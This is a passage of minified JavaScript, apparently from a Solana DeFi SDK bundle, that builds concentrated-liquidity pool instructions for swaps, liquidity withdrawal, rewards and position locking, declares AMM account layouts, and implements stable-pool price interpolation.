            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: LI, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...v,
          ],
          k = ct.alloc(b.span);
        b.encode({ liquidity: m, amountMinA: g, amountMinB: y }, k);
        let I = ct.from([...nE.decreaseLiquidity, ...k]);
        return new ws({ keys: A, programId: t, data: I });
      }
      static decreaseLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        liquidity: o,
        amountMinA: i,
        amountMinB: s,
        programId: a,
        nft2022: u,
      }) {
        let [c, l] = [new Xi(t.programId), new Xi(t.id)],
          d = FB.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          f = FB.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: h } = yB(c, l, d),
          { publicKey: p } = yB(c, l, f),
          { publicKey: m } = h_(r.wallet, n.nftMint, u ? Tc : a),
          { publicKey: g } = bB(c, n.nftMint),
          { publicKey: y } = wB(c, l, n.tickLower, n.tickUpper),
          w = [];
        for (let A = 0; A < t.rewardDefaultInfos.length; A++)
          w.push({
            poolRewardVault: new Xi(e.rewardInfos[A].vault),
            ownerRewardVault: r.rewardAccounts[A],
            rewardMint: new Xi(t.rewardDefaultInfos[A].mint.address),
          });
        let b = [],
          v = this.decreaseLiquidityInstruction(
            c,
            r.wallet,
            m,
            g,
            l,
            y,
            h,
            p,
            r.tokenAccountA,
            r.tokenAccountB,
            new Xi(e.vault.A),
            new Xi(e.vault.B),
            new Xi(t.mintA.address),
            new Xi(t.mintB.address),
            w,
            o,
            i,
            s,
            RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [d, f])
              ? kB(c, l).publicKey
              : void 0
          );
        return (
          b.push(v),
          {
            address: {
              tickArrayLower: h,
              tickArrayUpper: p,
              positionNftAccount: m,
              personalPosition: g,
              protocolPosition: y,
            },
            signers: [],
            instructions: b,
            instructionTypes: [vS],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static swapInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g
      ) {
        let y = VT([
            NT("amount"),
            NT("otherAmountThreshold"),
            DT("sqrtPriceLimitX64"),
            zT("isBaseInput"),
          ]),
          w = [
            ...(g ? [{ pubkey: g, isSigner: !1, isWritable: !0 }] : []),
            ...l.map((t) => ({ pubkey: t, isSigner: !1, isWritable: !0 })),
          ],
          b = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: LI, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !1 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            ...w,
          ],
          v = ct.alloc(y.span);
        y.encode(
          {
            amount: f,
            otherAmountThreshold: h,
            sqrtPriceLimitX64: p,
            isBaseInput: m,
          },
          v
        );
        let A = ct.from([...nE.swap, ...v]);
        return new ws({ keys: b, programId: t, data: A });
      }
      static makeSwapBaseInInstructions({
        poolInfo: t,
        poolKeys: e,
        observationId: n,
        ownerInfo: r,
        inputMint: o,
        amountIn: i,
        amountOutMin: s,
        sqrtPriceLimitX64: a,
        remainingAccounts: u,
      }) {
        let [c, l] = [new Xi(t.programId), new Xi(t.id)],
          [d, f] = [new Xi(e.vault.A), new Xi(e.vault.B)],
          [h, p] = [new Xi(t.mintA.address), new Xi(t.mintB.address)],
          m = t.mintA.address === o.toString();
        return {
          signers: [],
          instructions: [
            this.swapInstruction(
              c,
              r.wallet,
              l,
              new Xi(t.config.id),
              m ? r.tokenAccountA : r.tokenAccountB,
              m ? r.tokenAccountB : r.tokenAccountA,
              m ? d : f,
              m ? f : d,
              m ? h : p,
              m ? p : h,
              u,
              n,
              i,
              s,
              a,
              !0,
              kB(c, l).publicKey
            ),
          ],
          instructionTypes: [kS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {},
        };
      }
      static makeSwapBaseOutInstructions({
        poolInfo: t,
        poolKeys: e,
        observationId: n,
        ownerInfo: r,
        outputMint: o,
        amountOut: i,
        amountInMax: s,
        sqrtPriceLimitX64: a,
        remainingAccounts: u,
      }) {
        let [c, l] = [new Xi(t.programId), new Xi(t.id)],
          [d, f] = [new Xi(e.vault.A), new Xi(e.vault.B)],
          [h, p] = [new Xi(t.mintA.address), new Xi(t.mintB.address)],
          m = t.mintA.address === o.toBase58();
        return {
          signers: [],
          instructions: [
            this.swapInstruction(
              c,
              r.wallet,
              l,
              new Xi(t.config.id),
              m ? r.tokenAccountB : r.tokenAccountA,
              m ? r.tokenAccountA : r.tokenAccountB,
              m ? f : d,
              m ? d : f,
              m ? p : h,
              m ? h : p,
              u,
              n,
              i,
              s,
              a,
              !1,
              kB(c, l).publicKey
            ),
          ],
          instructionTypes: [IS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {},
        };
      }
      static initRewardInstruction(t, e, n, r, o, i, s, a, u, c, l, d) {
        let f = VT([
            NT("openTime"),
            NT("endTime"),
            DT("emissionsPerSecondX64"),
          ]),
          h = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
          ],
          p = ct.alloc(f.span);
        f.encode(
          { openTime: bI(c), endTime: bI(l), emissionsPerSecondX64: d },
          p
        );
        let m = ct.from([...nE.initReward, ...p]);
        return new ws({ keys: h, programId: t, data: m });
      }
      static initRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfo: r,
      }) {
        let [o, i] = [new Xi(t.programId), new Xi(t.id)],
          s = (function (t, e, n) {
            return u_([lB, e.toBuffer(), n.toBuffer()], t);
          })(o, i, r.mint).publicKey,
          a = AB(o).publicKey;
        return {
          address: { poolRewardVault: s, operationId: a },
          signers: [],
          instructions: [
            this.initRewardInstruction(
              o,
              n.wallet,
              i,
              a,
              new Xi(t.config.id),
              n.tokenAccount,
              r.programId,
              r.mint,
              s,
              r.openTime,
              r.endTime,
              r.emissionsPerSecondX64
            ),
          ],
          instructionTypes: [SS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static setRewardInstruction(t, e, n, r, o, i, s, a, u, c, l, d) {
        let f = VT([
            MT("rewardIndex"),
            DT("emissionsPerSecondX64"),
            NT("openTime"),
            NT("endTime"),
          ]),
          h = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
          ],
          p = ct.alloc(f.span);
        f.encode(
          {
            rewardIndex: u,
            emissionsPerSecondX64: d,
            openTime: bI(c),
            endTime: bI(l),
          },
          p
        );
        let m = ct.from([...nE.setRewardEmissions, ...p]);
        return new ws({ keys: h, programId: t, data: m });
      }
      static setRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfo: r,
      }) {
        let o,
          i,
          s,
          [a, u] = [new Xi(t.programId), new Xi(t.id)];
        for (let l = 0; l < t.rewardDefaultInfos.length; l++)
          t.rewardDefaultInfos[l].mint.address === r.mint.toString() &&
            ((o = l),
            (i = new Xi(e.rewardInfos[l].vault)),
            (s = new Xi(e.rewardInfos[l].mint.address)));
        (void 0 === o || void 0 === i) &&
          eE.logWithError(
            "reward mint check error",
            "no reward mint",
            t.rewardDefaultInfos
          );
        let c = AB(a).publicKey;
        return {
          address: { rewardVault: i, operationId: c },
          signers: [],
          instructions: [
            this.setRewardInstruction(
              a,
              n.wallet,
              u,
              c,
              new Xi(t.config.id),
              n.tokenAccount,
              i,
              s,
              o,
              r.openTime,
              r.endTime,
              r.emissionsPerSecondX64
            ),
          ],
          instructionTypes: [_S],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static collectRewardInstruction(t, e, n, r, o, i, s) {
        let a = VT([MT("rewardIndex")]),
          u = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: LI, isSigner: !1, isWritable: !1 },
          ],
          c = ct.alloc(a.span);
        a.encode({ rewardIndex: s }, c);
        let l = ct.from([...nE.collectReward, ...c]);
        return new ws({ keys: u, programId: t, data: l });
      }
      static collectRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardMint: r,
      }) {
        let o,
          i,
          [s, a] = [new Xi(t.programId), new Xi(t.id)];
        for (let u = 0; u < t.rewardDefaultInfos.length; u++)
          t.rewardDefaultInfos[u].mint.address === r.toString() &&
            ((o = u), (i = new Xi(e.rewardInfos[u].vault)));
        return (
          (void 0 === o || void 0 === i) &&
            eE.logWithError(
              "reward mint check error",
              "no reward mint",
              t.rewardDefaultInfos
            ),
          {
            address: { rewardVault: i },
            signers: [],
            instructions: [
              this.collectRewardInstruction(
                s,
                n.wallet,
                a,
                n.tokenAccount,
                i,
                r,
                o
              ),
            ],
            instructionTypes: [TS],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static async makeLockPositions({
        programId: t,
        authProgramId: e,
        poolProgramId: n,
        payer: r,
        wallet: o,
        nftMint: i,
        nft2022: s,
        getEphemeralSigners: a,
      }) {
        let u,
          c = [];
        if (a) u = new Xi((await a(1))[0]);
        else {
          let t = Hu.generate();
          c.push(t), (u = t.publicKey);
        }
        let l = s ? h_(o, i, Tc).publicKey : h_(o, i, _c).publicKey,
          { publicKey: d } = bB(n, i),
          f = _B(t, u).publicKey,
          h = h_(o, u, _c).publicKey,
          p = vB(u).publicKey;
        return {
          address: {
            positionId: d,
            lockPositionId: f,
            lockNftAccount: h,
            lockNftMint: u,
            positionNftAccount: l,
            metadataAccount: p,
          },
          instructions: [
            iE.lockPositionInstructionV2({
              programId: t,
              auth: e,
              payer: r,
              positionOwner: o,
              lockOwner: o,
              positionNftAccount: l,
              positionId: d,
              lockPositionId: f,
              lockNftMint: u,
              lockNftAccount: h,
              metadataAccount: p,
              withMetadata: !0,
              nft2022: s,
              positionNftMint: i,
              authPositionNftAccount: h_(e, i, s ? Tc : _c).publicKey,
              positionNftProgram: s ? Tc : _c,
            }),
          ],
          signers: c,
          instructionTypes: [CS],
          lookupTableAddress: [],
        };
      }
      static lockPositionInstructionV2({
        programId: t,
        auth: e,
        payer: n,
        positionOwner: r,
        lockOwner: o,
        positionNftAccount: i,
        positionId: s,
        positionNftMint: a,
        authPositionNftAccount: u,
        positionNftProgram: c,
        lockPositionId: l,
        lockNftMint: d,
        lockNftAccount: f,
        metadataAccount: h,
        withMetadata: p,
      }) {
        let m = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !0, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !0, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
          ],
          g = VT([zT("withMetadata")]),
          y = ct.alloc(g.span);
        g.encode({ withMetadata: p }, y);
        let w = ct.from([...rE, ...y]);
        return new ws({ keys: m, programId: t, data: w });
      }
      static lockPositionInstruction({
        programId: t,
        authProgramId: e,
        poolProgramId: n,
        owner: r,
        positionNft: o,
      }) {
        let { publicKey: i } = h_(r, o, _c),
          { publicKey: s } = bB(n, o),
          a = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !0, isWritable: !1 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: SB(t, s).publicKey, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
          ];
        return new ws({ keys: a, programId: t, data: ct.from(rE) });
      }
      static harvestLockPositionInstruction(t) {
        let [e, n] = [new Xi(t.poolKeys.programId), new Xi(t.poolKeys.id)],
          r = FB.getTickArrayStartIndexByTick(
            t.ownerPosition.tickLower,
            t.poolKeys.config.tickSpacing
          ),
          o = FB.getTickArrayStartIndexByTick(
            t.ownerPosition.tickUpper,
            t.poolKeys.config.tickSpacing
          ),
          { publicKey: i } = yB(e, n, r),
          { publicKey: s } = yB(e, n, o),
          { publicKey: a } = h_(t.owner, t.ownerPosition.nftMint, _c),
          { publicKey: u } = bB(e, t.ownerPosition.nftMint),
          { publicKey: c } = wB(
            e,
            n,
            t.ownerPosition.tickLower,
            t.ownerPosition.tickUpper
          ),
          l = [];
        for (let h = 0; h < t.poolKeys.rewardInfos.length; h++)
          l.push({
            poolRewardVault: new Xi(t.poolKeys.rewardInfos[h].vault),
            ownerRewardVault: t.ownerRewardAccounts[h],
            rewardMint: new Xi(t.poolKeys.rewardInfos[h].mint.address),
          });
        let d = [
            ...l
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          f = [
            { pubkey: t.authProgramId, isSigner: !1, isWritable: !1 },
            {
              pubkey: SB(t.programId, u).publicKey,
              isSigner: !1,
              isWritable: !1,
            },
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: t.owner, isSigner: !0, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            {
              pubkey: new Xi(t.poolKeys.vault.A),
              isSigner: !1,
              isWritable: !0,
            },
            {
              pubkey: new Xi(t.poolKeys.vault.B),
              isSigner: !1,
              isWritable: !0,
            },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: t.userVaultA, isSigner: !1, isWritable: !0 },
            { pubkey: t.userVaultB, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: NI, isSigner: !1, isWritable: !1 },
            {
              pubkey: new Xi(t.poolKeys.mintA.address),
              isSigner: !1,
              isWritable: !1,
            },
            {
              pubkey: new Xi(t.poolKeys.mintB.address),
              isSigner: !1,
              isWritable: !1,
            },
            ...d,
          ];
        return new ws({ keys: f, programId: t.programId, data: ct.from(oE) });
      }
      static harvestLockPositionInstructionV2({
        programId: t,
        auth: e,
        lockPositionId: n,
        clmmProgram: r,
        lockOwner: o,
        lockNftMint: i,
        lockNftAccount: s,
        positionNftAccount: a,
        positionId: u,
        poolId: c,
        protocolPosition: l,
        vaultA: d,
        vaultB: f,
        tickArrayLower: h,
        tickArrayUpper: p,
        userVaultA: m,
        userVaultB: g,
        mintA: y,
        mintB: w,
        rewardAccounts: b,
        exTickArrayBitmap: v,
      }) {
        let A = [
            ...(v ? [{ pubkey: v, isSigner: !1, isWritable: !0 }] : []),
            ...b
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          k = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: m, isSigner: !1, isWritable: !0 },
            { pubkey: g, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: NI, isSigner: !1, isWritable: !1 },
            { pubkey: y, isSigner: !1, isWritable: !1 },
            { pubkey: w, isSigner: !1, isWritable: !1 },
            ...A,
          ];
        return new ws({ keys: k, programId: t, data: ct.from(oE) });
      }
    };
  VT([
    LT("mintAuthorityOption"),
    WT("mintAuthority"),
    NT("supply"),
    MT("decimals"),
    MT("isInitialized"),
    LT("freezeAuthorityOption"),
    WT("freezeAuthority"),
  ]);
  var sE = (t) =>
      new GI({
        mint: t.address,
        decimals: t.decimals,
        symbol: t.symbol,
        name: t.name,
      }),
    aE = (t) => {
      var e = t,
        { amount: n, isRaw: r, name: o } = e,
        i = kA(e, ["amount", "isRaw", "name"]);
      return new BI(
        new GI({
          mint: FI(i.address).toBase58(),
          decimals: i.decimals,
          symbol: i.symbol,
          name: o,
        }),
        n,
        r,
        o
      );
    },
    uE = (t) => {
      var e = t,
        { address: n, programId: r, decimals: o } = e,
        i = kA(e, ["address", "programId", "decimals"]);
      return vA(
        {
          chainId: 101,
          address: FI(n).toBase58(),
          programId: r,
          logoURI: "",
          symbol: "",
          name: "",
          decimals: o,
          tags: [],
          extensions: i.extensions || {},
        },
        i
      );
    },
    cE = (t) =>
      t
        ? AA(vA({}, t), {
            transferFeeConfigAuthority: t.transferFeeConfigAuthority.toBase58(),
            withdrawWithheldAuthority: t.withdrawWithheldAuthority.toBase58(),
            withheldAmount: t.withheldAmount.toString(),
            olderTransferFee: AA(vA({}, t.olderTransferFee), {
              epoch: t.olderTransferFee.epoch.toString(),
              maximumFee: t.olderTransferFee.maximumFee.toString(),
            }),
            newerTransferFee: AA(vA({}, t.newerTransferFee), {
              epoch: t.newerTransferFee.epoch.toString(),
              maximumFee: t.newerTransferFee.maximumFee.toString(),
            }),
          })
        : void 0,
    lE = new Zn(25),
    dE = new Zn(1e4),
    fE = VT([MT("instruction"), NT("amountIn"), NT("minAmountOut")]),
    hE = VT([MT("instruction"), NT("maxAmountIn"), NT("amountOut")]);
  VT([MT("instruction"), MT("nonce")]),
    VT([MT("instruction"), MT("nonce"), NT("startTime")]);
  var pE = VT([
    NT("status"),
    NT("nonce"),
    NT("maxOrder"),
    NT("depth"),
    NT("baseDecimal"),
    NT("quoteDecimal"),
    NT("state"),
    NT("resetFlag"),
    NT("minSize"),
    NT("volMaxCutRatio"),
    NT("amountWaveRatio"),
    NT("baseLotSize"),
    NT("quoteLotSize"),
    NT("minPriceMultiplier"),
    NT("maxPriceMultiplier"),
    NT("systemDecimalValue"),
    NT("minSeparateNumerator"),
    NT("minSeparateDenominator"),
    NT("tradeFeeNumerator"),
    NT("tradeFeeDenominator"),
    NT("pnlNumerator"),
    NT("pnlDenominator"),
    NT("swapFeeNumerator"),
    NT("swapFeeDenominator"),
    NT("baseNeedTakePnl"),
    NT("quoteNeedTakePnl"),
    NT("quoteTotalPnl"),
    NT("baseTotalPnl"),
    NT("poolOpenTime"),
    NT("punishPcAmount"),
    NT("punishCoinAmount"),
    NT("orderbookToInitTime"),
    DT("swapBaseInAmount"),
    DT("swapQuoteOutAmount"),
    NT("swapBase2QuoteFee"),
    DT("swapQuoteInAmount"),
    DT("swapBaseOutAmount"),
    NT("swapQuote2BaseFee"),
    WT("baseVault"),
    WT("quoteVault"),
    WT("baseMint"),
    WT("quoteMint"),
    WT("lpMint"),
    WT("openOrders"),
    WT("marketId"),
    WT("marketProgramId"),
    WT("targetOrders"),
    WT("withdrawQueue"),
    WT("lpVault"),
    WT("owner"),
    NT("lpReserve"),
    HT(NT(), 3, "padding"),
  ]);
  VT([
    NT("accountType"),
    NT("status"),
    NT("nonce"),
    NT("maxOrder"),
    NT("depth"),
    NT("baseDecimal"),
    NT("quoteDecimal"),
    NT("state"),
    NT("resetFlag"),
    NT("minSize"),
    NT("volMaxCutRatio"),
    NT("amountWaveRatio"),
    NT("baseLotSize"),
    NT("quoteLotSize"),
    NT("minPriceMultiplier"),
    NT("maxPriceMultiplier"),
    NT("systemDecimalsValue"),
    NT("abortTradeFactor"),
    NT("priceTickMultiplier"),
    NT("priceTick"),
    NT("minSeparateNumerator"),
    NT("minSeparateDenominator"),
    NT("tradeFeeNumerator"),
    NT("tradeFeeDenominator"),
    NT("pnlNumerator"),
    NT("pnlDenominator"),
    NT("swapFeeNumerator"),
    NT("swapFeeDenominator"),
    NT("baseNeedTakePnl"),
    NT("quoteNeedTakePnl"),
    NT("quoteTotalPnl"),
    NT("baseTotalPnl"),
    NT("poolOpenTime"),
    NT("punishPcAmount"),
    NT("punishCoinAmount"),
    NT("orderbookToInitTime"),
    DT("swapBaseInAmount"),
    DT("swapQuoteOutAmount"),
    DT("swapQuoteInAmount"),
    DT("swapBaseOutAmount"),
    NT("swapQuote2BaseFee"),
    NT("swapBase2QuoteFee"),
    WT("baseVault"),
    WT("quoteVault"),
    WT("baseMint"),
    WT("quoteMint"),
    WT("lpMint"),
    WT("modelDataAccount"),
    WT("openOrders"),
    WT("marketId"),
    WT("marketProgramId"),
    WT("targetOrders"),
    WT("owner"),
    HT(NT(), 64, "padding"),
  ]);
  var mE = VT([
      MT("instruction"),
      NT("baseAmountIn"),
      NT("quoteAmountIn"),
      NT("fixedSide"),
      NT("otherAmountMin"),
    ]),
    gE = VT([
      MT("instruction"),
      NT("lpAmount"),
      NT("baseAmountMin"),
      NT("quoteAmountMin"),
    ]),
    yE = VT([NT("fee")]),
    wE = new Xi("CDSr3ssLcRB6XYPJwAfFt18MZvEZp4LjHcvzBVZ45duo"),
    bE = 5e4,
    vE = VT([NT("x"), NT("y"), NT("price")]),
    AE = VT([
      NT("accountType"),
      NT("status"),
      NT("multiplier"),
      NT("validDataCount"),
      HT(vE, bE, "DataElement"),
    ]);
  function kE(t, e, n) {
    let [r, o] = [0, bE - 2],
      i = r,
      s = o,
      a = 0,
      u = (e * t.multiplier) / n;
    for (; i <= s; ) {
      if (((a = Math.floor((s + i) / 2)), 0 === a || a >= bE - 2))
        return [a, a, !1];
      let e = (t.DataElement[a].x * t.multiplier) / t.DataElement[a].y,
        n = (t.DataElement[a - 1].x * t.multiplier) / t.DataElement[a - 1].y,
        r = (t.DataElement[a + 1].x * t.multiplier) / t.DataElement[a + 1].y;
      if (u === e) return [a, a, !0];
      if (u === n) return [a - 1, a - 1, !0];
      if (u === r) return [a + 1, a + 1, !0];
      if (u < n) s = a - 1;
      else {
        if (u > n && u < e) return [a - 1, a, !0];
        if (u > e && u < r) return [a, a + 1, !0];
        i = a + 1;
      }
    }
    return [a, a, !1];
  }
  function IE(t, e, n) {
    let [r, o, i] = kE(t, e, n);
    if (!i) return 0;
    if (r === o) {
      let n = t.DataElement[r].x;
      return (e * t.multiplier) / n;
    }
    {
      let i = t.DataElement[r].x,
        s = t.DataElement[r].y,
        a = t.DataElement[o].x,
        u = t.DataElement[o].y,
        c = n * (a * s - i * u),
        l = i * c + (a - i) * (e * s - i * n) * u;
      return (e * t.multiplier * c) / l;
    }
  }
  function SE(t, e, n) {
    return (e * t.multiplier) / n;
  }
  function _E(t, e, n) {
    return (e * n) / t.multiplier;
  }
  function TE(t, e) {
    let [n, r] = [0, bE - 2],
      o = n,
      i = r,
      s = 0,
      a = e;
    for (; o < i; ) {
      if (((s = Math.floor((i + o) / 2)), s <= 0 || s > bE - 2))
        return [s, s, !1];
      let e = t.DataElement[s].x,
        n = t.DataElement[s - 1].x,
        r = t.DataElement[s + 1].x;
      if (a === e) return [s, s, !0];
      if (a === n) return [s - 1, s - 1, !0];
      if (a === r) return [s + 1, s + 1, !0];
      if (a < n) i = s - 1;
      else {
        if (a > n && a < e) return [s - 1, s, !0];
        if (a > e && a < r) return [s, s + 1, !0];
        o = s + 1;
      }
    }
    return [s, s, !1];
  }
  function CE(t, e) {
    let [n, r] = [0, bE - 2],
      o = n,
      i = r,
      s = 0,
      a = e;
    for (; o <= i; ) {
      if (((s = Math.floor((i + o) / 2)), s <= 0 || s >= bE - 2))
        return [s, s, !1];
      let e = t.DataElement[s].y,
        n = t.DataElement[s - 1].y,
        r = t.DataElement[s + 1].y;
      if (a === e) return [s, s, !0];
      if (a === n) return [s - 1, s - 1, !0];
      if (a === r) return [s + 1, s + 1, !0];
      if (a < r) o = s + 1;
      else {
        if (a < n && a > e) return [s - 1, s, !0];
        if (a < e && a > r) return [s, s + 1, !0];
        i = s - 1;
      }
    }
    return [s, s, !1];
  }
  function BE(t, e, n, r) {
    let o = r ? e + n : e - n,
      [i, s, a] = TE(t, o);
    if (!a) return [0, 0, !1, a];
    if (i === s) return [t.DataElement[s].price, t.DataElement[s].y, !1, a];
    {
      let n = t.DataElement[i].x,
        u = t.DataElement[s].x,
        c = t.DataElement[i].price,
        l = t.DataElement[s].price,
        d = t.DataElement[i].y,
        f = t.DataElement[s].y;
      if (e >= n && e <= u) return r ? [l, f, !0, a] : [c, d, !0, a];
      {
        let i, s;
        return (
          r
            ? ((i = c + ((l - c) * (e - n)) / (u - n)),
              (s = d - ((o - n) * t.multiplier) / l))
            : ((i = c + ((l - c) * (e - n)) / (u - n)),
              (s = f + ((u - o) * t.multiplier) / c)),
          [i, s, !1, a]
        );
      }
    }
  }
  function EE(t, e, n, r) {
    let o = IE(t, e, n),
      i = SE(t, e, o),
      s = SE(t, n, o),
      a = SE(t, r, o),
      [u, c, l, d] = (function (t, e, n) {
        let r = e + n,
          [o, i, s] = CE(t, r);
        if (!s) return [0, 0, !1, s];
        if (o === i) return [t.DataElement[i].price, t.DataElement[i].x, !1, s];
        {
          let n = t.DataElement[o].x,
            a = t.DataElement[i].x,
            u = t.DataElement[o].price,
            c = t.DataElement[i].price,
            l = t.DataElement[o].y,
            d = t.DataElement[i].y;
          if (e >= d && e <= l) return [u, n, !0, s];
          {
            let n, o;
            return (
              (n = u + ((c - u) * (l - e)) / (l - d)),
              (o = a - (u * (r - d)) / t.multiplier),
              [n, o, !1, s]
            );
          }
        }
      })(t, s, a);
    if (!d) return 0;
    if (l) return (r * u) / t.multiplier;
    return _E(t, i - c, o);
  }
  function xE(t, e, n, r) {
    let o =
      (function (t, e) {
        let n = BE(t, e, 0, !1);
        return n[3] ? n[0] : 0;
      })(t, SE(t, e, IE(t, e, n))) / t.multiplier;
    return 1 / o;
  }
  var PE = class {
      constructor({ connection: t }) {
        (this._layoutData = {
          accountType: 0,
          status: 0,
          multiplier: 0,
          validDataCount: 0,
          DataElement: [],
        }),
          (this.connection = t);
      }
      get stableModelData() {
        return this._layoutData;
      }
      async initStableModelLayout() {
        if (0 === this._layoutData.validDataCount && this.connection) {
          let t = await this.connection.getAccountInfo(wE);
          t &&
            (this._layoutData = (function (t) {
              let e = AE.decode(t);
              return {
                accountType: e.accountType.toNumber(),
                status: e.status.toNumber(),
                multiplier: e.multiplier.toNumber(),
                validDataCount: e.validDataCount.toNumber(),
                DataElement: e.DataElement.map((t) => ({
                  x: t.x.toNumber(),
                  y: t.y.toNumber(),
                  price: t.price.toNumber(),
                })),
              };
            })(null == t ? void 0 : t.data));
